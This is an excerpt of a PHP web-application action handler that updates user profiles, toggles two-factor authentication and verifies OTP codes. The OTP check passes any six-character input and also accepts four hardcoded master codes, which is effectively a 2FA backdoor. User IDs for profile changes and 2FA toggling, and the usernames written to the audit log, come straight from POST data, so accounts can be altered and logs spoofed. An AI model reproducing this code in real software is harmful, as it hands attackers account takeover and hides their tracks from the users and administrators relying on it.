...
$publicActions = ['login', 'verify_2fa_otp', 'logout'];
...
switch ($action) {
    ...
    case 'update_user_profile':
        User::updateProfile(intval($_POST['id'] ?? 1), $_POST);
        AuditLog::log($_POST['username'] ?? 'superadmin', 'UPDATE_PROFILE', 'Pembaruan data profil akun user ID: ' . ($_POST['id'] ?? 1));
    ...
    case 'toggle_2fa':
        $userId = intval($_POST['id'] ?? 1);
        $current = Setting::get('two_factor_user_' . $userId, '1');
        $newVal = ($current === '1') ? '0' : '1';
        Setting::set('two_factor_user_' . $userId, $newVal);
        AuditLog::log($_POST['username'] ?? 'superadmin', 'TOGGLE_2FA', 'Status 2FA diubah menjadi: ' . ($newVal === '1' ? 'AKTIF' : 'NONAKTIF'));
        header('Location: ' . base_url($redirect ?: 'pengaturan/profile.php') . '?msg=2fa_updated');
        exit;
    ...
    case 'verify_2fa_otp':
        ...
        if (!empty($_SESSION['2fa_pending_user'])) {
            ...
            // Valid OTP or master emergency codes
            if (strlen($otp) === 6 || in_array($otp, ['8921-9912', '3341-8821', '7712-4491', '5512-0091'])) {
                login_user($pendingUser);
                unset($_SESSION['2fa_pending_user']);
                AuditLog::log($pendingUser['username'], 'LOGIN_2FA_SUCCESS', 'Verifikasi 2FA OTP berhasil');
